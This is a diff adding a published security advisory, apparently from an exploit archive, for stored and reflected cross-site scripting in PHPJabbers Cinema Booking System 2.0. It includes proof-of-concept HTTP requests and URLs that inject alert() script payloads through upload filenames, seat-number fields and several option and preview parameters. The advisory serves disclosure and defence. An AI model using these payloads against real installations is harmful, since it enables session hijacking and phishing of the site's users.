@@ -1,0 +1,139 @@
+id: 39898
+date: 02/05/2025
+title: PHPJabbers Cinema Booking System 2.0 Cross Site Scripting Vulnerability
+author: Astik Rawat
+cves: CVE-2024-57427, CVE-2024-57428
+
+# CVE-2024-57428
+A stored cross-site scripting (XSS) vulnerability in PHPJabbers Cinema Booking System v2.0 exists due to unsanitized input in file upload fields (event_img, seat_maps) and seat number configurations (number[new_X] in pjActionCreate). Attackers can inject persistent JavaScript, leading to phishing, malware injection, and session hijacking.
+
+Vulnerable Parameter: ```event_img``` and ```seat_maps's file name```
+
+
+## Impact:
+Stored XSS is more severe than reflective XSS, as it affects all users who access the injected content. It could be leveraged for persistent phishing attacks, session theft, or injecting malware onto a large user base.
+
+
+## Exploit - Proof of Concept (POC)
+### Stored Cross-Site Scripting (XSS)
+
+
+
+### File Upload Stored XSS
+Payload: ```\"><img src=a onerror=alert(1)>```
+
+```
+POST /CinemaBookingDev/index.php?controller=pjAdminEvents&action=pjActionCreate HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 38611
+[SNIP]
+
+
+------WebKitFormBoundaryKOsvqJhAGpZAt33t
+Content-Disposition: form-data; name="event_img"; filename="luffy.jpg\"><img src=a onerror=alert(1)>"
+Content-Type: image/jpeg
+```
+
+### CINEMA HALL SEAT NUMBER
+Payload: ```"><script>alert(x)</script>```
+
+```
+POST /CinemaBookingDev/index.php?controller=pjAdminVenues&action=pjActionCreate HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 1812
+[SNIP]
+
+
+------WebKitFormBoundaryip9Mc6LkKna3bpSD
+Content-Disposition: form-data; name="seats_count"
+
+11
+------WebKitFormBoundaryip9Mc6LkKna3bpSD
+Content-Disposition: form-data; name="number[new_1]"
+
+1"><script>alert(1)</script>1
+------WebKitFormBoundaryip9Mc6LkKna3bpSD
+Content-Disposition: form-data; name="number[new_2]"
+
+2"><script>alert(2)</script>2
+```
+
+
+
+
+
+# CVE-2024-57427 - Reflected Cross-Site Scripting (XSS)
+PHPJabbers Cinema Booking System v2.0 is vulnerable to reflected cross-site scripting (XSS). Multiple endpoints improperly handle user input, allowing malicious scripts to execute in a victim’s browser. Attackers can craft malicious links to steal session cookies or conduct phishing attacks.
+
+#### Vulnerable Parameter:
+
+**Affected POST Request Functions**
+- OPTIONS > BOOKING FORM:
+    - value-enum-o_currency
+    - value-enum-o_booking_status
+    - value-enum-o_payment_status
+    - value-enum-o_payment_disable
+    - value-enum-o_allow_paypal
+    - value-enum-o_allow_authorize
+    - value-enum-o_allow_cash
+    - value-enum-o_allow_creditcard
+    - value-enum-o_allow_bank
+- OPTIONS > BOOKING:
+    - value-enum-o_bf_include_title
+    - value-enum-o_bf_include_name
+    - value-enum-o_bf_include_email
+    - value-enum-o_bf_include_phone
+    - value-enum-o_bf_include_company
+    - value-enum-o_bf_include_address
+    - value-enum-o_bf_include_country
+    - value-enum-o_bf_include_state
+    - value-enum-o_bf_include_city
+    - value-enum-o_bf_include_zip
+    - value-enum-o_bf_include_notes
+    - value-enum-o_bf_include_captcha
+
+**Affected GET Request Functions**
+- locale
+- hide
+- theme
+
+## Impact:
+An attacker could execute arbitrary JavaScript code in a victim's browser, enabling data theft, session hijacking, and phishing attacks. This vulnerability could compromise the security and integrity of user sessions and potentially the application itself.
+
+## Exploit - Proof of Concept (POC)
+### Reflected Cross-Site Scripting (XSS)
+
+Payload: ```<script>alert(x)</script>```
+
+### Full POST Request
+
+```
+POST /CinemaBookingDev/index.php?controller=pjAdminOptions&action=pjActionUpdate HTTP/1.1
+Host: 127.0.0.1
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Cookie: CinemaBooking=xxxxxxxxxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+Content-Length: 778
+
+options_update=1&next_action=pjActionBookingForm&value-enum-o_bf_include_title=XXS1<script>alert(1)</script>&value-enum-o_bf_include_name=XXS2<script>alert(2)</script>&value-enum-o_bf_include_email=XXS3<script>alert(3)</script>&value-enum-o_bf_include_phone=XXS4<script>alert(4)</script>&value-enum-o_bf_include_company=XXS5<script>alert(5)</script>&value-enum-o_bf_include_address=XXS6<script>alert(6)</script>&value-enum-o_bf_include_country=XXS7<script>alert(7)</script>&value-enum-o_bf_include_state=XXS8<script>alert(8)</script>&value-enum-o_bf_include_city=XXS9<script>alert(9)</script>&value-enum-o_bf_include_zip=XXS10<script>alert(10)</script>&value-enum-o_bf_include_notes=XXS11<script>alert(11)</script>&value-enum-o_bf_include_captcha=XXS12<script>alert(12)</script>
+```
+### Full GET Request
+
+Payload: ```"><script>alert(x)</script>``` and ```"></script><script>alert(x)</script>```
+
+
+```
+http://127.0.0.1/CinemaBookingDev/preview.php?locale=1&hide=0&theme=theme2"><script>alert(1)</script>&selected_date=21-12-2024
+http://127.0.0.1/CinemaBookingDev/preview.php?locale=1&hide=XXS1"></script><script>alert(1)</script>&theme=theme2&selected_date=21-12-2024
+http://127.0.0.1/CinemaBookingDev/preview.php?locale=1se"></script><script>alert(1)</script>&hide=0&theme=theme2&selected_date=21-12-2024
+http://127.0.0.1/CinemaBookingDev/index.php?controller=pjAdminEvents&action=pjActionGetSeats&event_id=14&venue_id=2&date_time=15-12-2024 00:00&index=new_1492"><script>alert(1)</script>
+```
+
+#  0day.today [2025-02-07]  #
